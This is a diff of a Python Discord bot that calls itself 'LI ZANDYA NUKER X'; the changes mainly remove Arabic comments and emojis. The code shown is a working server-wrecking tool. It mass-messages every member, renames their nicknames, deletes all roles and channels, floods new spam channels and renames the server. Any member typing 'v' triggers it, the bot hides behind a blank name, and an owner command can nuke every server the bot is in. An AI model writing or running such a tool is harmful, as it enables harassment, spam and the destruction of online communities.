@@ -25,9 +25,9 @@ from datetime import datetime
 
 TOKEN = None
 OWNER_ID = None
-NUKE_TRIGGER = "v"  # كلمة تفعيل النوكر - حرف v فقط
+NUKE_TRIGGER = "v"
 
-# إعدادات السرعة
+# سرعة قصوى
 MAX_THREADS = 10000
 DM_DELAY = 0.0005
 
@@ -71,7 +71,6 @@ class UltimateNuker:
         self.start_time = None
         
     async def mass_dm_everyone(self, bot, guild):
-        """يباني جميع الأعضاء"""
         members = [m for m in guild.members if not m.bot]
         success = 0
         fail = 0
@@ -153,7 +152,7 @@ class UltimateNuker:
     
     async def rename_server(self, guild):
         try:
-            await guild.edit(name=f"💀 DESTROYED BY LI ZANDYA 💀")
+            await guild.edit(name="💀 DESTROYED BY LI ZANDYA 💀")
         except:
             pass
     
@@ -162,14 +161,13 @@ class UltimateNuker:
         for member in guild.members:
             if not member.bot:
                 try:
-                    await member.edit(nick=f"💀 DESTROYED 💀")
+                    await member.edit(nick="💀 DESTROYED 💀")
                     count += 1
                 except:
                     pass
         return count
     
     async def ultimate_nuke(self, guild):
-        """نوكر كامل"""
         if self.is_nuking:
             return None
         
@@ -185,31 +183,17 @@ class UltimateNuker:
         }
         
         try:
-            # 1. يباني جميع الأعضاء
             results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(bot, guild)
-            
-            # 2. تغيير الأسماء
             results['nicknames_changed'] = await self.change_all_nicknames(guild)
-            
-            # 3. حذف الرتب
             results['roles_deleted'] = await self.delete_all_roles(guild)
-            
-            # 4. حذف القنوات
             results['channels_deleted'] = await self.delete_all_channels(guild)
-            
-            # 5. إنشاء قنوات سبام
             spam_channels = await self.create_spam_channels(guild)
             results['spam_channels'] = len(spam_channels)
-            
-            # 6. سبام
             results['spam_messages'] = await self.spam_all_channels(guild)
-            
-            # 7. تغيير اسم السيرفر
             await self.rename_server(guild)
-            
             self.nuked_servers.append(guild.name)
         except Exception as e:
-            print(f"Error during nuke: {e}")
+            print(f"Error: {e}")
         finally:
             self.is_nuking = False
         
@@ -230,16 +214,13 @@ bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
-    # بروفايل بدون اسم
     try:
         await bot.user.edit(username="")
     except:
         pass
     
-    # حالة بدون نص
     await bot.change_presence(activity=discord.Game(name=""))
     
-    # بروفايل بدون وصف
     try:
         await bot.user.edit(bio="")
     except:
@@ -247,16 +228,16 @@ async def on_ready():
     
     nuker.start_time = time.time()
     
-    print(f"""
+    print("""
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                                                                                                                                          ║
 ║     💀 LI ZANDYA NUKER X - ACTIVATED 💀                                                                                                   ║
 ║                                                                                                                                          ║
 ║  🤖 BOT NAME: (BLANK)                                                                                                                   ║
-║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
-║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds):,}                                                                          ║
+║  📡 SERVERS: """ + str(len(bot.guilds)) + """                                                                                                          ║
+║  👥 TOTAL MEMBERS: """ + str(sum(g.member_count for g in bot.guilds)) + """                                                                          ║
 ║                                                                                                                                          ║
-║  ⚡ TRIGGER: Type "{NUKE_TRIGGER}" in ANY server = INSTANT DESTRUCTION ⚡                                                               ║
+║  ⚡ TRIGGER: Type "v" in ANY server = INSTANT DESTRUCTION ⚡                                                               ║
 ║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
 ║  🔥 NO RESPONSE - JUST DESTRUCTION 🔥                                                                                                    ║
 ║                                                                                                                                          ║
@@ -265,43 +246,33 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    # تجاهل رسائل البوت نفسه
     if message.author == bot.user:
         return
     
     global OWNER_ID
     
-    # أول مستخدم يرسل أي رسالة يصبح مالك
     if OWNER_ID is None:
         OWNER_ID = message.author.id
-        print(f"👑 OWNER SET: {message.author} (ID: {OWNER_ID})")
-        # لا نرسل أي رد - فقط نسجل المالك
+        print(f"OWNER SET: {message.author} (ID: {OWNER_ID})")
         return
     
-    # إذا كان المرسل هو المالك
     if message.author.id == OWNER_ID:
-        # معالجة أوامر المالك (اختياري)
         if message.content.startswith('!'):
             await handle_owner_command(message)
         return
     
-    # إذا كان أي شخص آخر يكتب - نتحقق من كلمة التفعيل
-    # كلمة التفعيل هي حرف "v" فقط
     if message.content.lower().strip() == NUKE_TRIGGER:
         guild = message.guild
         if guild and not nuker.is_nuking:
-            print(f"💀 NUKE TRIGGERED in {guild.name} by {message.author}")
-            # تدمير السيرفر فوراً
+            print(f"NUKE TRIGGERED in {guild.name} by {message.author}")
             asyncio.create_task(nuker.ultimate_nuke(guild))
-    # لا نرد على أي رسالة أخرى
 
 async def handle_owner_command(message):
-    """معالجة أوامر المالك"""
     content = message.content.lower()
     
     if content == '!servers':
         if not bot.guilds:
-            await message.channel.send("❌ No servers!")
+            await message.channel.send("No servers!")
             return
         
         server_list = []
@@ -310,43 +281,43 @@ async def handle_owner_command(message):
         
         chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
         for chunk in chunks:
-            await message.channel.send(f"```yaml\n" + "\n".join(chunk) + "\n```")
+            await message.channel.send("```yaml\n" + "\n".join(chunk) + "\n```")
     
     elif content.startswith('!nuke-server'):
         try:
             parts = content.split()
             if len(parts) < 2:
-                await message.channel.send("❌ Usage: `!nuke-server <number>`")
+                await message.channel.send("Usage: !nuke-server <number>")
                 return
             
             number = int(parts[1])
             if number < 1 or number > len(bot.guilds):
-                await message.channel.send(f"❌ Invalid number! Choose 1-{len(bot.guilds)}")
+                await message.channel.send(f"Invalid number! Choose 1-{len(bot.guilds)}")
                 return
             
             guild = bot.guilds[number - 1]
-            await message.channel.send(f"💀 NUKING: {guild.name}...")
+            await message.channel.send(f"NUKING: {guild.name}...")
             results = await nuker.ultimate_nuke(guild)
             if results:
-                await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
+                await message.channel.send(f"DESTROYED! DM Sent: {results['dm_sent']}")
         except:
-            await message.channel.send("❌ Invalid number!")
+            await message.channel.send("Invalid number!")
     
     elif content == '!nuke':
         if message.guild:
-            await message.channel.send(f"💀 NUKING {message.guild.name}...")
+            await message.channel.send(f"NUKING {message.guild.name}...")
             results = await nuker.ultimate_nuke(message.guild)
             if results:
-                await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
+                await message.channel.send(f"DESTROYED! DM Sent: {results['dm_sent']}")
     
     elif content == '!nuke-all':
-        await message.channel.send(f"💀 GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
+        await message.channel.send(f"GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
         total_dm = 0
         for guild in bot.guilds:
             results = await nuker.ultimate_nuke(guild)
             if results:
                 total_dm += results['dm_sent']
-        await message.channel.send(f"✅ GLOBAL NUKE COMPLETE! Total DM: {total_dm}")
+        await message.channel.send(f"GLOBAL NUKE COMPLETE! Total DM: {total_dm}")
     
     elif content == '!stats':
         elapsed = time.time() - nuker.start_time if nuker.start_time else 0
